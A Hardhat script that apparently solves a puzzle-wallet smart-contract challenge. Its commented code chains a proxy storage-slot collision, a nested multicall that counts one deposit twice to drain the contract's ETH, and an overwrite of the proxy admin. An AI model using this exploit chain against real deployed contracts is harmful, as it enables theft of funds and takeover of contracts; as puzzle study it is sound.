const hre = require("hardhat");

async function main() {

  const [player] = await hre.ethers.getSigners();
  // Contract instance actually refers to IMPLEMENTATION contract rather than the proxy contract
  // In this case we can use the ABI from the proxy contract & the wallet address to interact with either contract
  // But in either case we'll be overwriting the storage in the wallet contract
  const contractAddress = '0x7f375A79A3d15e846966fa8ed205A308258C772b';
  // Connect to the puzzle wallet instance
  const wallet = await hre.ethers.getContractAt("PuzzleWallet", contractAddress);
  // Connect to the proxy contract with the same address
  const proxy = await hre.ethers.getContractAt("PuzzleProxy", contractAddress);

  // // If we call "proposeNewAdmin(address) on the proxy contract we'll overwrite slot 0 in the wallet contract -- which is the owner"
  const tx1 = await proxy.connect(player).proposeNewAdmin(player.address);
  const receipt1 = await tx1.wait()
  // // Check that we're now the owner of the wallet contract and a pendingAdmin of the proxy contract
  console.log(`Proxy Pending Admin: ${await proxy.connect(player).pendingAdmin()}`);
  console.log(`Wallet Owner: ${await wallet.connect(player).owner()}\n`);

  // // Now that we're the owner of the wallet contract we can add ourselves to the whitelist to do other functions on the contract
  const tx2 = await wallet.connect(player).addToWhitelist(player.address);
  const receipt2 = await tx2.wait()
  // // Check we're on the whitelist
  console.log(`Player added to whitelist: ${await wallet.connect(player).whitelisted(player.address)}\n`); // will return true if completed successfully

  // Similarly to how we became the owner of the wallet, we'll call the "setMaxBalance" with the uint256 of our own address
  // This is set an arbitrary maxBalance on the wallet contract --- but also set us to the admin on the proxy contract!!
  
  // First we need to drain the contract though. Let's get the total balance
  const contractEth = await hre.ethers.provider.getBalance(wallet.address);
  console.log(`Contract Balance Before Hack: ${ethers.utils.formatEther(contractEth)} ETH`);

  // To drain the contract we're going to call multicall to run 3 calls within 1 transaction:
    // 1: We'll call deposit with a value of "contractEth"
      // this will increment our balance in the contract to be = contractEth
  const func1 = wallet.interface.encodeFunctionData('deposit');

    // 2: We'll call mulitcall with 1 deposit call again 
      // this will reset the "depositCalled" flag, allowing us to "deposit" double the Eth than hat we're sending in msg.value
  const func2 = wallet.interface.encodeFunctionData('multicall', [[func1]]);
      // 3: Call execute to ourselves with a value of double the contract Eth.. 
      // We've deposited 1 contractEth, and the contract has 1 contractEth, but our balance according to the contract is 2 contractEth
  const func3 = wallet.interface.encodeFunctionData('execute', [player.address, contractEth*2, []]);
  const funcArray = [func1, func2, func3];
  console.log(`Encoded Attack Functions Array:\t${funcArray}`);
  const tx3 = await wallet.connect(player).multicall(funcArray, { from: player.address, value: contractEth });
  const receipt3 = await tx3.wait();
  console.log(`Contract Balance After Hack: ${await hre.ethers.provider.getBalance(wallet.address)}\n`);

  // Now that the contract has 0 ETH we can call setMaxBalance with our own address to overwrite the second memory slot in both contracts
  // which includes the admin address in the proxy contract

  tx4 = await wallet.connect(player).setMaxBalance(player.address);
  const receipt4 = await tx4.wait();
  console.log(`New admin:\t${await proxy.connect(player).admin()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
